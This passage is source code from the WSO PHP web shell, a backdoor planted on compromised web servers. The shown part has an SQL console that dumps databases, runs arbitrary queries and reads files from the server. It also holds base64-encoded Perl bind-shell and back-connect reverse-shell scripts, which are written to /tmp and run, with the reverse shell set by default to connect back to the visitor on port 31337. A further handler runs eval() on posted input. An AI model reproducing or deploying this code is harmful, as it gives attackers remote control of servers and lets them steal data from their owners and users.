									echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";

									$tbls_res = $db->listTables();

									while ($item = $db->fetch($tbls_res)) {

										list($key, $value) = each($item);

										if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));

										$value = htmlspecialchars($value);

										echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";

									}

									echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File file_path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";

									if (@$_POST['p1'] == 'select') {

										$_POST['p1'] = 'query';

										$_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;

										$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);

										$num = $db->fetch();

										$pages = ceil($num['n'] / 30);

										echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";

										echo " of $pages";

										if ($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>&lt; Prev</a>";

										if ($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next &gt;</a>";

										$_POST['p3']--;

										if ($_POST['type'] == 'pgsql') $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);

										else $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';

										echo "<br><br>";

									}

									if ((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {

										$db->query(@$_POST['p2']);

										if ($db->res !== false) {

											$title = false;

											echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';

											$line = 1;

											while ($item = $db->fetch()) {

												if (!$title) {

													echo '<tr>';

													foreach ($item as $key => $value) echo '<th>' . $key . '</th>';

													reset($item);

													$title = true;

													echo '</tr><tr>';

													$line = 2;

												}

												echo '<tr class="l' . $line . '">';

												$line = $line == 1 ? 2 : 1;

												foreach ($item as $key => $value) {

													if ($value == null) echo '<td><i>null</i></td>';

													else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';

												}

												echo '</tr>';

											}

											echo '</table>';

										} else {

											echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';

										}

									}

									echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";

									if (!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']);

									echo "</textarea><br/><input type=submit value='Execute'>";

									echo "</td></tr>";

								}

								echo "</table></form><br/>";

								if ($_POST['type'] == 'mysql') {

									$db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");

									if ($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";

								}

								if (@$_POST['p1'] == 'loadfile') {

									$file = $db->loadFile($_POST['p2']);

									echo '<br/><pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';

								}

							} else {

								echo htmlspecialchars($db->error());

							}

							echo '</div>';

							wsoFooter();

						}

						function actionNetwork() {

							wsoHeader();

							$back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";

							$bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";

							echo "<h1>Network tools</h1><div class=content>

		<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">

		<span>Bind port to /bin/sh [perl]</span><br/>

		Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>

		</form>

		<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">

		<span>Back-connect  [perl]</span><br/>

		Server: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>

		</form><br>";

							if (isset($_POST['p1'])) {

								function cf($f, $t) {

									$w = @fopen($f, "w");

									if ($w) {

										@fwrite($w, @base64_decode($t));

										@fclose($w);

									}

								}

								if ($_POST['p1'] == 'bpp') {

									cf("/tmp/bp.pl", $bind_port_p);

									$out = wsoEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1>/dev/null 2>&1 &");

									sleep(1);

									echo "<pre class=ml1>$out\n" . wsoEx("ps aux | grep bp.pl") . "</pre>";

									unlink("/tmp/bp.pl");

								}

								if ($_POST['p1'] == 'bcp') {

									cf("/tmp/bc.pl", $back_connect_p);

									$out = wsoEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");

									sleep(1);

									echo "<pre class=ml1>$out\n" . wsoEx("ps aux | grep bc.pl") . "</pre>";

									unlink("/tmp/bc.pl");

								}

							}

							echo '</div>';

							wsoFooter();

						}

						function actionRC() {

							if (!@$_POST['p1']) {

								$a = array("uname" => php_uname(), "php_version" => phpversion(), "wso_version" => WSO_VERSION, "safemode" => @ini_get('safe_mode'));

								echo serialize($a);

							} else {

								eval($_POST['p1']);

							}

						}

						if (empty($_POST['a'])) if (isset($default_action) && function_exists('action' . $default_action)) $_POST['a'] = $default_action;

						else $_POST['a'] = 'SecInfo';

						if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) call_user_func('action' . $_POST['a']);

						exit;

					}

					catch(Exception $e) {

						echo '<span class="text-red">' . $e->getMessage() . '</span>';

					}



